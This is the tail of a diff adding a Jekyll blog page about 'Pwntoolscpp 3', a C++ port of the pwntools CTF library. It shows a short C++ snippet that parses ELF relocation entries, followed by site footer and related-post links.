+    <span class="n">info</span>          <span class="o">=</span> <span class="n">convertor</span><span class="p">(</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="p">);</span>
+    <span class="n">symbol</span>        <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_sym</span><span class="p">(</span> <span class="n">info</span> <span class="p">);</span>
+    <span class="n">type</span>          <span class="o">=</span> <span class="n">get_sym_and_type</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">get_r_type</span><span class="p">(</span> <span class="n">info</span> <span class="p">);</span>
+<span class="err">}</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-01-21T00:00:00+09:00">January 21, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Pwntoolscpp+3%20https%3A%2F%2Flucid78.github.io%2Fpwntoolscpp-3%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Flucid78.github.io%2Fpwntoolscpp-3%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Flucid78.github.io%2Fpwntoolscpp-3%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/pwntoolscpp-2/" class="pagination--pager" title="Pwntoolscpp 2
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/pwntoolscpp-2/" rel="permalink">Pwntoolscpp 2
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">라이브러리로 작성된 완전한 코드는 아래에서 확인 가능하다.
+https://github.com/lucid78/pwntoolscpp
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/pwntoolscpp-1/" rel="permalink">Pwntoolscpp 1
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (https://github.com/Gallopsled/pwntools)
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 lucid7. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
